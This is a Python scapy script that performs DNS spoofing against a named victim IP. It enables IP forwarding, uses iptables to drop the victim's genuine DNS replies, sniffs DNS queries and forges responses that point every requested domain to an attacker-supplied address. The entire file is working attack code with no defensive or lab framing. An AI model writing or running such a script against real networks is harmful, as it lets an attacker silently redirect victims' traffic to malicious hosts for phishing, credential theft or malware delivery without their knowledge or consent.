from scapy.all import *
import os
import socket

def dns_spoof(victimIP,spoofIP):

    # Enable IP forwarding
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    # Block all other DNS quires we dont want to forward
    os.system("iptables -A FORWARD -p udp --sport 53 -d" + victimIP + " -j DROP")
    os.system("iptables -A FORWARD -p tcp --sport 53 -d" + victimIP + " -j DROP")


    # define sniff function monitoring port 53
    def sniffing():
        print ("--------------------Started Sniffing for DNS Quires------------------")
        sniff(prn=process_dns, filter='udp and port 53', store=0)


    # we dont want our own packets to be modified
    def get_own_ip_address():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 1))
        return s.getsockname()[0]



    def process_dns(pkt):
        # Filter all the DNS request quires
        if ('DNS' in pkt and pkt['DNS'].opcode == 0 and pkt['DNS'].ancount == 0 and pkt['IP'].src != get_own_ip_address()):
            # Print 'dns request'
            print(pkt.summary())
            # Genrate a Spoofed response to redirect victim to spoofIP
            spfResp = IP(dst=pkt[IP].src, src=pkt[IP].dst) \
                / UDP(dport=pkt[UDP].sport, sport=53) \
                / DNS(id=pkt[DNS].id, qr=1,\
                    qd=DNSQR(qname=pkt[DNSQR].qname),\
                     an=DNSRR(rrname=pkt[DNSQR].qname, rdata=spoofIP, ttl=3600))

            send(spfResp, verbose=0)
            return ("Spoofed DNS Response Sent: \n" + spfResp.summary())

    # start sniffing all packets
    sniffing()